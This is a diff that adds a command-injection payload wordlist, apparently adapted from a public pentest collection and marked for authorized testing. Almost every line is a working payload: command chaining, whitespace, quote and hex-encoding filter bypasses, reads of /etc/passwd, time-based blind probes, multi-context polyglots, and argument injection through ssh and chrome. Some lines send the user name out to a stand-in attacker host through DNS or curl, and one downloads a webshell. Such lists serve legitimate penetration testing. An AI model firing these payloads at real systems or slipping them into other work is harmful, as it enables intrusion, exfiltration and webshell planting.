@@ -1,0 +1,101 @@
+# Command injection — filter bypass + polyglot (PAT Command Injection README)
+# Full PAT Intruder list blocked by Windows Defender on sync — use Linux or add exclusion
+# Authorized testing only.
+
+# === Chaining ===
+; id
+&& id
+|| id
+| id
+& id
+`id`
+$(id)
+; id #
+&& id #
+|| id #
+| id #
+
+# === Null / comment termination ===
+; id #
+; id --
+; id ;
+|| id #
+| id #
+
+# === Space bypass (Unix) ===
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+X=$'id\x20-a'&&$X
+;ls%09-al%09/home
+%0aid
+%0d%0aid
+
+# === Quote / backtick bypass ===
+w'h'o'am'i
+wh''oami
+w"h"o"am"i
+wh``oami
+w\ho\am\i
+
+# === Variable expansion ===
+who$@ami
+who$()ami
+who$(echo am)i
+who`echo am`i
+/???/??t /???/p??s??
+
+# === Hex encoding ===
+$(echo -e "\x69\x64")
+`echo -e "\x69\x64"`
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+
+# === Backslash newline ===
+cat /et\
+c/pa\
+sswd
+cat%20/et%5C%0Ac/pa%5C%0Asswd
+
+# === Brace expansion ===
+{,ip,a}
+{,ifconfig}
+{l,-lh}s
+
+# === Remove trailing args ===
+id --
+ping 127.0.0.1 --
+
+# === Background / nohup ===
+nohup sleep 120 > /dev/null &
+
+# === Time-based blind ===
+; sleep 5 #
+&& sleep 5 #
+|| sleep 5 #
+| sleep 5 #
+`sleep 5`
+$(sleep 5)
+
+# === OOB DNS exfil ===
+; nslookup $(whoami).ATTACKER.oastify.com #
+; curl ATTACKER/$(whoami) #
+
+# === Polyglot (multi-context) ===
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+
+# === Argument injection ===
+chrome '--gpu-launcher="id > /tmp/out"'
+ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
+curl http://ATTACKER/ -o webshell.php
+
+# === PHP escapeshellarg bypass patterns ===
+'; id #
+"; id #
+'; id; echo '
+`id`
+$(id)
+
+# === Windows cross-ref ===
+# See cmdi/windows-powershell.txt
